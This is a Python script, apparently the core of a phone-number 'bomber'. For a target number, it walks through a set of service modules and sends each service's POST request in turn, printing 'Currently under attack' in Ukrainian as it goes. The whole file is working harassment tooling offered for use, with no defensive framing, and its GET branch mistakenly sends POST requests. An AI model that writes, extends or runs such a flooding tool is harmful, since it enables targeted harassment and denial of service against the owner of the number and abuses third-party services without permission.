# -*- coding: utf-8 -*-

import resource, requests, importlib, time, sys, os
from inspect import getmembers, ismodule

class Runner:
    resourceList = []
    target = ""

    def __init__(self, targetNumber):
        self.resourceList = getmembers(resource, ismodule)
        self.target = targetNumber
        self.attackProcess()

    def attackProcess(self):
        for resource in self.resourceList:
            className = resource[0][0].upper() + resource[0][1:]
            classObject = getattr(resource[1], className)
            resourceObject = classObject(self.target)
            time.sleep(1)
            print("Зараз у атаці: " + resourceObject.resourceName)
            self.attackProcessRequest(resourceObject)

    def attackProcessRequest(self, classObject):

        if classObject.requestType == "POST":
            if classObject.requestJson:
                try:
                    requests.post(classObject.requestUrl, json = classObject.requestJson, headers = {"User-Agent": classObject.requestUserAgent}, cookies = classObject.requestCookie, timeout=10)
                except requests.exceptions.Timeout:
                    print('The request timed out')
            else:
                try:
                    print(requests.post(classObject.requestUrl, data = classObject.requestData, headers = {"User-Agent": classObject.requestUserAgent}, cookies = classObject.requestCookie, timeout=10).text)
                except requests.exceptions.Timeout:
                    print('The request timed out')
        elif classObject.requestType == "GET":
            try:
                print(requests.post(classObject.requestUrl, headers = {"User-Agent": classObject.requestUserAgent}, cookies = classObject.requestCookie, timeout=10).text)
            except requests.exceptions.Timeout:
                print('The request timed out')